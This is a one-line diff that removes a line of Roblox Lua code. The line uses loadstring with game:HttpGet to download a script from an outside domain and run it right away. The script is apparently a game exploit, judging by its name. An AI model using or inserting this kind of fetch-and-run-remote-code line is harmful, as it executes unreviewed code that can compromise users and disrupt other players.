@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://shattered-gang.lol/kill_r63_with_doom_music.lua"))()
